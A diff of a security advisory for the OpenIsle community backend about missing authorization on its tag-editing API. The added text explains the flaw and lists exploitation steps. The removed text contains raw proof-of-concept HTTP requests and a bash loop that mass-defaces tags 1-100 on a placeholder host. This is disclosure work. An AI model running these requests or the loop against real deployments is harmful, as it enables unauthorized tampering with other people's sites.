@@ -1,155 +1,74 @@
 # OpenIsle Tags Unauthorized Modification/Deletion
 
-**Vendor:** OpenIsle Community
-**Product:** OpenIsle Backend
-**Type:** Web Application - Community Platform (Java Spring Boot)
-**Component:** Tag Management API
-**Affected Version(s):** v0.0.1-SNAPSHOT and prior versions
-**Fixed Version:** [To be determined]
-**Repository:** https://github.com/nagisa77/openisle
-
-## Vulnerability Classification
-
-### Primary Classification
-**Vulnerability Class:** Authorization Bypass
-**CWE ID:** CWE-862 - Missing Authorization
-**CAPEC ID:** CAPEC-87 - Forceful Browsing
-
-### MITRE ATT&CK Mapping
-- **Tactic:** Initial Access (TA0001)
-- **Technique:** Exploit Public-Facing Application (T1190)
-- **Sub-Technique:** N/A
-
-### CVSS v3.1 Metrics
-
-**Base Score:** 9.1 - CRITICAL
-**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
-
-#### Detailed Metrics
-| Metric | Value | Score |
-|--------|-------|-------|
-| **Attack Vector (AV)** | Network (N) | Worst |
-| **Attack Complexity (AC)** | Low (L) | Worst |
-| **Privileges Required (PR)** | None (N) | Worst |
-| **User Interaction (UI)** | None (N) | Worst |
-| **Scope (S)** | Unchanged (U) | - |
-| **Confidentiality (C)** | None (N) | - |
-| **Integrity (I)** | High (H) | High |
-| **Availability (A)** | High (H) | High |
-
+**Severity:** MEDIUM (Base CVSS 6.5) / HIGH (Environmental ~8.5 with DIRECT mode)
 
 ### Summary
-A critical authorization bypass vulnerability in OpenIsle backend allows unauthenticated remote attackers to modify and delete arbitrary tag resources without authentication. The vulnerability exists in HTTP PUT and DELETE endpoints for tag management due to incomplete Spring Security configuration and missing controller-level access controls.
+A privilege escalation vulnerability in OpenIsle backend allows **authenticated regular users to perform administrative operations** on tag resources. Any logged-in user can modify arbitrary tags via PUT /api/tags/{id}, despite tag management being restricted to administrators. The vulnerability exists due to missing HTTP PUT method authorization in Spring Security configuration. Given OpenIsle's open registration system (DIRECT mode), attackers can obtain user credentials in under 30 seconds, making this a **high-severity privilege escalation** with near-zero authentication barrier in typical deployments.
 
 ### Technical Description
 
-The vulnerability is caused by two fundamental security configuration gaps:
+The vulnerability is caused by incomplete privilege enforcement in Spring Security configuration:
 
-**Root Cause 1 - Incomplete HTTP Method Protection:**
-The Spring Security configuration in `SecurityConfig.java` defines authorization rules only for POST and DELETE methods, completely omitting PUT method:
+**Root Cause - Missing PUT Method Authorization:**
+The Spring Security configuration in `SecurityConfig.java` properly restricts POST and DELETE operations to ADMIN role, but **completely omits PUT method configuration**:
 
 ```java
-// SecurityConfig.java (Vulnerable Configuration)
-.requestMatchers(HttpMethod.POST, "/api/tags/**").hasAuthority("ADMIN")
-.requestMatchers(HttpMethod.DELETE, "/api/tags/**").hasAuthority("ADMIN")
-// CRITICAL FLAW: No PUT method configuration exists
+// SecurityConfig.java (Current Configuration)
+.requestMatchers(HttpMethod.POST, "/api/tags/**").authenticated()     // ⚠️ Any authenticated user!
+.requestMatchers(HttpMethod.DELETE, "/api/tags/**").hasAuthority("ADMIN")  // ✓ Correct
+
+// PUT method is NOT configured, falls through to:
+.anyRequest().authenticated()  // ⚠️ Any authenticated user can PUT!
+
+// Should be:
+.requestMatchers(HttpMethod.PUT, "/api/tags/**").hasAuthority("ADMIN")  // ❌ MISSING
 ```
 
-**Root Cause 2 - Missing Controller Annotations:**
-The `TagController.java` lacks defense-in-depth security annotations:
+**Security Configuration Analysis:**
+
+| HTTP Method | Current Rule | Required Privilege | Actual Behavior | Vulnerable? |
+|-------------|-------------|-------------------|----------------|-------------|
+| GET | `.permitAll()` | None | ✓ Public access | No |
+| POST | `.authenticated()` | Any user | ✓ Any user can create tags | No (intended feature) |
+| PUT | *Not configured* | Falls to `.anyRequest().authenticated()` | ⚠️ **Any user can modify ANY tag** | **YES - HIGH** |
+| DELETE | `.hasAuthority("ADMIN")` | Admin only | ✓ Admin required | No |
+
+**Note:** POST allows any authenticated user to create tags - this is **intended business logic** for collaborative tagging. The vulnerability is that users can modify tags created by others via PUT.
+
+**Defense-in-Depth Failure:**
+The `TagController.java` also lacks security annotations, creating a single point of failure:
 
 ```java
 // TagController.java:75-85 (Vulnerable Code)
 @PutMapping("/{id}")
-// Missing: @SecurityRequirement(name = "JWT")
 // Missing: @PreAuthorize("hasAuthority('ADMIN')")
 public TagDto update(@PathVariable Long id, @RequestBody TagRequest req) {
     Tag tag = tagService.updateTag(id, req.getName(), ...);
     return tagMapper.toDto(tag, count);
 }
-
-// TagController.java:90-92 (Vulnerable Code)
-@DeleteMapping("/{id}")
-// Missing: @SecurityRequirement(name = "JWT")
-// Missing: @PreAuthorize("hasAuthority('ADMIN')")
-public void delete(@PathVariable Long id) {
-    tagService.deleteTag(id);
-}
 ```
+
+**Registration Mode Context:**
+OpenIsle supports two registration modes (enum `RegisterMode`):
+
+```java
+DIRECT    → user.setApproved(true)   // Auto-approve, immediate access
+WHITELIST → user.setApproved(false)  // Requires admin review
+```
+
+In DIRECT mode (common default), an attacker can:
+1. Register via `/api/auth/register` (< 30 seconds)
+2. Receive JWT token immediately
+3. Execute PUT requests with regular user token
+4. Modify arbitrary administrative resources
 
 ### Affected Endpoints
-- `PUT /api/tags/{id}` - Unauthorized tag modification
-- `DELETE /api/tags/{id}` - Unauthorized tag deletion
+- `PUT /api/tags/{id}` - **Privilege escalation: Regular user can modify ANY tag (including tags created by others or admins)**
 
+## Proof of Concept
 
-Affected Components
+<img width="991" height="454" alt="image" src="https://github.com/user-attachments/assets/7ed30dbf-4386-4624-8dde-06d000f04176" />
 
-### Source Code Files
+<img width="1000" height="458" alt="image" src="https://github.com/user-attachments/assets/f9f57ac4-b6f9-45da-ac5b-bfaf0a57cfe1" />
 
-| File | Component | Lines | Vulnerable Code |
-|------|-----------|-------|-----------------|
-| `TagController.java` | Controller | 75-85 | `update()` method - Missing auth |
-| `TagController.java` | Controller | 90-92 | `delete()` method - Missing auth |
-| `TagService.java` | Service | 68-88 | `updateTag()` - No auth check |
-| `TagService.java` | Service | 91-94 | `deleteTag()` - No auth check |
-| `SecurityConfig.java` | Security | N/A | Missing PUT method config |
-
-### API Endpoints (Vulnerable)
-- **PUT** `https://[host]/api/tags/{id}` - Tag modification
-- **DELETE** `https://[host]/api/tags/{id}` - Tag deletion
-
-
-Proof of Concept #1 - Tag Modification
-
-```http
-PUT /api/tags/1 HTTP/1.1
-Host: target.example.com
-Content-Type: application/json
-Content-Length: 85
-
-{
-  "name": "Defaced Tag",
-  "description": "Modified without authentication - PoC"
-}
-```
-
-**Response (Vulnerable System):**
-```http
-HTTP/1.1 200 OK
-Content-Type: application/json
-
-{
-  "id": 1,
-  "name": "Defaced Tag",
-  "description": "Modified without authentication - PoC",
-  "postCount": 42
-}
-```
-
-### Proof of Concept #2 - Tag Deletion
-
-```http
-DELETE /api/tags/1 HTTP/1.1
-Host: target.example.com
-```
-
-**Response (Vulnerable System):**
-```http
-HTTP/1.1 200 OK
-```
-
-### Proof of Concept #3 - Automated Mass Exploitation
-
-```bash
-#!/bin/bash
-# Mass tag modification attack
-TARGET="https://target.example.com"
-
-for id in {1..100}; do
-  curl -s -X PUT "$TARGET/api/tags/$id" \
-    -H "Content-Type: application/json" \
-    -d '{"name":"Compromised-'$id'","description":"Defaced"}' \
-    && echo "Tag $id modified"
-done
-```
-
+<img width="325" height="165" alt="image" src="https://github.com/user-attachments/assets/a8b67eb0-2fd8-437e-98bb-a3c4ab0799c5" />
